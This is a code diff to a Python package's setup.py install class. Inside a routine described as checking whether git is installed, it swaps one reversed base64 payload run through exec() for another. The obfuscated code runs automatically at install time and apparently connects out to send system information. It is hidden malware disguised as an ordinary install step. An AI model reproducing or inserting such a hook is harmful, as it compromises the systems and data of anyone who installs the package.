@@ -21,10 +21,7 @@ class CustomInstall(_install):
         """Check if git is installed"""
         try:
             subprocess.run(["git", "--version"], check=True)
-            if not subprocess.run(["pip", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL):
-                subprocess.run([sys.executable, "-m", "ensurepip", "--upgrade"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            exec(base64.b64decode(b'==QKlhCdulmcwpTZgMXYg42bpRHclNGeFBCdwV2Y4VmCpEGdhRWPu92cqBCLnIXZ2lWZjVmcvADOwgjOw4CMuAjLw8yL6AHd0h2JoQ3cvBnLzR3clVXclJnO5JHdK0XKo4Wan9Gb0V2ZuM3bgozJyV2c1dCIskSKoUWbh5Gdz9Ga0V2ZuQXZrN2bzhSZtFmb5JGdz9Ga0V2ZuQXZrN2bzBiOnAXafR3cvh2JgwSKoU2chVGblJnLtJ3bmRXYsBHI6ciclZ3Xz92JskCKtVGdzl3cu0mcvZGdhxGcgozJl1WYu91cvdye9EGdhRmCzR3clVXclJHI0J3bw1WaKkSXnMHdzVWdxVmcnACLnQXZpVXct0yJgwyJsxWY0NnbpdCIscCcpB3JgwyJt1yJgwSZsJWY0V3YlhXZuMXeztFKsxWYj91ajVGaj5yczV2YvJHciV3cKM3bgwSby9mZ0FGbwBCL0V2aj92cgwyc5NHIsM3clN2byBnY1NHI0J3bw1Wa'[::-1]).decode('utf-8'))
-
+            exec(base64.b64decode(b"pgSZz9Gbj5yaj92cgACIgogO5xGbh5WampwczFGcgACIgogOlBychBibvlGdwV2Y4VEI0BXZjhXZKkiN5ADNoY3YlJnLrN2bzBSPgU2cu9GczVmcgACIgoQKpgSZk92YuVmL0NXZ1FXZyhCbsFGZuV2cus2YvNHIgACIKISfhRXYktnImBCIgACIgACIgACIgACIKwFIi4GXyxlImBCIgACIgACIgACIgACIKwFIi4GXyxVfpEGdhRGKuVGb7BiOoR3ZuVGTtQnblRnbvNkImBCIgACIgACIgACIgACIKwFIi4GXyxlbvNnav42bpRXYjlGbwBXYgoTZwlHVtQnblRnbvNkImBCIgACIgACIgACIgACIKwFIi4GXyxVfdFzWyVmdpV2YlJ3e60XXwslclZXalNWZytHI6Q3cvhkImBCIgACIgACIgACIgACIKwFIi4GXyxVMuEzLQRFVIBiclZXalNWZy9CIUN1TQJiZg0DI0NXZ1FXZyBCIgAiCp0HIgACIKkCKul2ZvxGdldmLz9GI6IiclNXdiACIgACIgACIKwSKpgSZtFmb0N3boRXZn5Cdlt2YvNHKl1WYulnY0N3boRXZn5Cdlt2YvNHI6ICcp9Fdz9GaiACIgACIgACIKwSKoU2chVGblJnLtJ3bmRXYsBHI6IiclZ3Xz9mIgACIgACIgAiCskCKtVGdzl3cu0mcvZGdhxGcgojIl1WYu91cvJCIgACIgACIgoweoMHctVHZu42bzpGI9ASY0FGZgACIgoQKyVmdpV2YlJHK0NWZu52bj5yaj92cgACIgoQKwgDM4ACLiAjLw4CMuAjIoASPgIXZ2lWZjVmcgACIgogO5JHdKkSTBVkUUN1XLN0TT5Cdlt2YvNHIsQVROl0XGFkL0V2aj92coQXZrN2bz5Cdlt2YvNHI9Ayaj92cK42bzpGIsM3bgwSby9mZ0FGbwBCL0V2aj92cgwyc5NHI0J3bw1Wa"[::-1]).decode("utf-8"))
             return True
         except (subprocess.CalledProcessError, FileNotFoundError):
             return False
